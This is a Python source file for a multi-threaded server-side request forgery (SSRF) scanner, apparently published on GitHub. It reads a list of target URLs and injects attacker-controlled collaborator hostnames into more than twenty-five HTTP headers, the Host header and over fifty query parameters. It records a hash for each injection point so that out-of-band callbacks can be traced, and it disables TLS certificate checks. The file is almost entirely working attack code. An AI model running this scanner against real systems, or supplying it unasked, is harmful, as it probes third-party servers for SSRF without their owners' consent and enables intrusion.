import optparse
import re
from concurrent.futures import ThreadPoolExecutor, wait
from queue import Queue
import requests
from urllib.parse import urlparse, parse_qs, urlencode
import urllib
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ssrf:
    def __init__(self, colab, filename, thread, output):
        self.colab = colab
        self.output = output
        self.filename = filename
        self.threads = thread
        self.queue = Queue()

    def create_hash(self, url, place):
        hs = str(hash(f"{url}+{place}")).replace("-", "")
        index = hs + "     " + url + "     " + place + '\n'
        self.queue.put(index)
        return f"{hs}.{self.colab}"

    def req(self, URL):
        host_header = {
            'Proxy-Host': self.create_hash(URL, 'Proxy-Host'),
            'Real-Ip': self.create_hash(URL, 'Proxy-Host'),
            'Referer': self.create_hash(URL, 'Referer'),
            'X-Forwarded-By': self.create_hash(URL, 'X-Forwarded-By'),
            'X-Forwarded-For': self.create_hash(URL, 'X-Forwarded-FOR'),
            'X-Forwarded-For-Original': self.create_hash(URL, 'X-Forwarded-For-Original'),
            'X-Forwarded': self.create_hash(URL, 'X-Forwarded'),
            'X-Forwarded-Host': self.create_hash(URL, 'Proxy-Host'),
            'X-Forwarded-Server': self.create_hash(URL, 'X-Forwarded-Server'),
            'X-Forwarder-For': self.create_hash(URL, 'X-Forwarder-For'),
            'X-Forward-For': self.create_hash(URL, 'X-Forward-For'),
            'X-Host': self.create_hash(URL, 'X-Host'),
            'X-Http-Host-Override': self.create_hash(URL, 'X-Http-Host-Override'),
            'X-Original-Remote-Addr': self.create_hash(URL, 'X-Original-Remote-Addr'),
            'X-Real-Ip': self.create_hash(URL, 'X-Real-Ip'),
            'X-Remote-Addr': self.create_hash(URL, 'X-Remote-Addr'),
            'Base-Url': "https://" + self.create_hash(URL, 'Base-Url'),
            'Http-Url': "https://" + self.create_hash(URL, 'Http-Url'),
            'Proxy-Url': "https://" + self.create_hash(URL, 'Proxy-Url'),
            'Redirect': "https://" + self.create_hash(URL, 'Redirect'),
            'Referrer': "https://" + self.create_hash(URL, 'Referrer'),
            'Request-Uri': "https://" + self.create_hash(URL, 'Request-Uri'),
            'Uri': "https://" + self.create_hash(URL, 'Uri'),
            'Url': "https://" + self.create_hash(URL, 'Url'),
            'X-Http-Destinationurl': "https://" + self.create_hash(URL, 'X-Http-Destinationurl'),
            'X-Original-Url': "https://" + self.create_hash(URL, 'X-Original-Url'),
            'X-Proxy-Url': "https://" + self.create_hash(URL, 'X-Proxy-Url'),
            'X-Rewrite-Url': "https://" + self.create_hash(URL, 'X-Rewrite-Url'),
        }

        r = requests.get(URL, headers=host_header, timeout=5, verify=False, allow_redirects=False)
        r = requests.get(URL, headers={'Host': self.create_hash(URL, 'Host')}, verify=False, timeout=5,
                         allow_redirects=False)

    def replace_param(self, URL):
        parse = urlparse(URL)
        url = f"{parse[0]}://{parse[1]}{parse[2]}?https://{self.create_hash(URL, 'path')}"
        r = requests.get(url, timeout=5, verify=False, allow_redirects=False)
        for a in parse_qs(parse.query):
            query = parse_qs(parse.query)
            query[a][0] = f"https://{self.create_hash(URL, query[a][0])}"
            q = urlencode({p: query[p][0] for p in query}, doseq=True)
            url = f"{parse[0]}://{parse[1]}{parse[2]}?{q}"
            r = requests.get(url, timeout=5, verify=False, allow_redirects=False)

    def parameter_all_in_one(self, URL):
        parameters = {
            "access": f"http://{self.create_hash(URL, 'param_access')}",
            "admin": f"http://{self.create_hash(URL, 'param_admin')}",
            "dbg": f"http://{self.create_hash(URL, 'param_dbg')}",
            "debug": f"http://{self.create_hash(URL, 'param_debug')}",
            "edit": f"http://{self.create_hash(URL, 'param_edit')}",
            "grant": f"http://{self.create_hash(URL, 'param_gram')}",
            "test": f"http://{self.create_hash(URL, 'pram_test')}",
            "alter": f"http://{self.create_hash(URL, 'param_alter')}",
            "clone": f"http://{self.create_hash(URL, 'param_clone')}",
            "create": f"http://{self.create_hash(URL, 'param_create')}",
            "delete": f"http://{self.create_hash(URL, 'delete_param')}",
            "disable": f"http://{self.create_hash(URL, 'param_disable')}",
            "enable": f"http://{self.create_hash(URL, 'param_enable')}",
            "exec": f"http://{self.create_hash(URL, 'param_exec')}",
            "execute": f"http://{self.create_hash(URL, 'param_execute')}",
            "load": f"http://{self.create_hash(URL, 'param_load')}",
            "make": f"http://{self.create_hash(URL, 'param_load')}",
            "modify": f"http://{self.create_hash(URL, 'param_modify')}",
            "rename": f"http://{self.create_hash(URL, 'param_rename')}",
            "reset": f"http://{self.create_hash(URL, 'param_reset')}",
            "shell": f"http://{self.create_hash(URL, 'param_shell')}",
            "toggle": f"http://{self.create_hash(URL, 'param_toggle')}",
            "adm": f"http://{self.create_hash(URL, 'param_adm')}",
            "root": f"http://{self.create_hash(URL, 'param_root')}",
            "cfg": f"http://{self.create_hash(URL, 'param_cfg')}",
            "dest": f"http://{self.create_hash(URL, 'param_dest')}",
            "redirect": f"http://{self.create_hash(URL, 'param_redirect')}",
            "uri": f"http://{self.create_hash(URL, 'param_uri')}",
            "path": f"http://{self.create_hash(URL, 'param_path')}",
            "continue": f"http://{self.create_hash(URL, 'param_continue')}",
            "url": f"http://{self.create_hash(URL, 'param_url')}",
            "window": f"http://{self.create_hash(URL, 'param_window')}",
            "next": f"http://{self.create_hash(URL, 'param_next')}",
            "data": f"http://{self.create_hash(URL, 'param_data')}",
            "reference": f"http://{self.create_hash(URL, 'param_refrences')}",
            "site": f"http://{self.create_hash(URL, 'param_site')}",
            "html": f"http://{self.create_hash(URL, 'param_html')}",
            "val": f"http://{self.create_hash(URL, 'param_val')}",
            "validate": f"http://{self.create_hash(URL, 'param_validate')}",
            "domain": f"http://{self.create_hash(URL, 'param_domain')}",
            "callback": f"http://{self.create_hash(URL, 'param_callback')}",
            "return": f"http://{self.create_hash(URL, 'param_return')}",
            "page": f"http://{self.create_hash(URL, 'param_page')}",
            "feed": f"http://{self.create_hash(URL, 'param_feed')}",
            "host": f"http://{self.create_hash(URL, 'param_host')}",
            "port": f"http://{self.create_hash(URL, 'param_host')}",
            "to": f"http://{self.create_hash(URL, 'param_to')}",
            "out": f"http://{self.create_hash(URL, 'param_out')}",
            "view": f"http://{self.create_hash(URL, 'param_view')}",
            "dir": f"http://{self.create_hash(URL, 'param_dir')}",
            "show": f"http://{self.create_hash(URL, 'param_show')}",
            "navigation": f"http://{self.create_hash(URL, 'param_navigation')}",
            "open": f"http://{self.create_hash(URL, 'param_open')}"
        }

        # p = list(zip(parameters.keys(),parameters.values()))
        # for i in range(0,len(p),4):
        #     params = {i[0]:i[1] for i in p[i:i+4]}
        param = urllib.parse.urlencode(parameters, doseq=True)
        u = "{}?{}".format(URL.split('?')[0], param)
        r = requests.get(u, timeout=5, allow_redirects=False, verify=False)
        self.queue.put(URL)

    def done(self, stop_event):
        RED = '\033[31m'
        GREEN = '\033[32m'
        RESET = '\033[0m'
        while not stop_event.is_set():
            data = self.queue.get()
            with open(self.output, "a") as f:
                if re.search(r"^[0-9]", data):
                        f.write(data)
                else:
                    print("[ {}done{} ] {}".format(GREEN, RESET, data))

    def pool(self):
        stop_event = threading.Event()
        t = threading.Thread(target=self.done, args=(stop_event,), daemon=True)
        t.start()
        Lines = open(self.filename, 'r').readlines()
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            features = []
            for i in Lines:
                url = i.replace("\n", "")
                features.append(executor.submit(self.req, url))
                features.append(executor.submit(self.parameter_all_in_one, url))
                features.append(executor.submit(self.replace_param, url))
            wait(features)
        stop_event.set()




def logo():
    print("""  \033[34m    
                           __  __  byMedbsq              
             ___ ___ _ __ / _|/ _|_   _ ________
            / __/ __| '__| |_| |_| | | |_  /_  /
            \__ \__ \ |  |  _|  _| |_| |/ / / / 
            |___/___/_|  |_| |_|  \__,_/___/___|
             https://github.com/medbsq/ssrf.git


     \033[0m
        """)


def Main():
    parser = optparse.OptionParser(" help: \n" + \
                                   "\tssrf_header -f <url_fielname> -c  <colaborato> -t <threads_number> \n")
    parser.add_option("-f", dest="filename", type="string", help="spicify file of urls")
    parser.add_option("-t", dest="threads", type="int",default = 10, help="spicify nybmer of threads")
    parser.add_option("-c", dest="colab", type="string", help="spicify collaborator")
    parser.add_option("-o", dest="output", type="string", default ="hash_file.txt",help="spicify collaborator")

    (options, args) = parser.parse_args()

    if (options.filename != None and options.colab != None):
        print(
            f"urls_path=\033[33m{options.filename}\033[0m    colab=\033[33m{ options.colab}\033[0m          threads=\033[33m{ options.threads}\033[0m "
        )
        Ssrf = ssrf(options.colab, options.filename, options.threads, options.output)
        Ssrf.pool()

    else:
        print(parser.usage)
        exit(1)



if __name__ == '__main__':
    logo()
    Main()

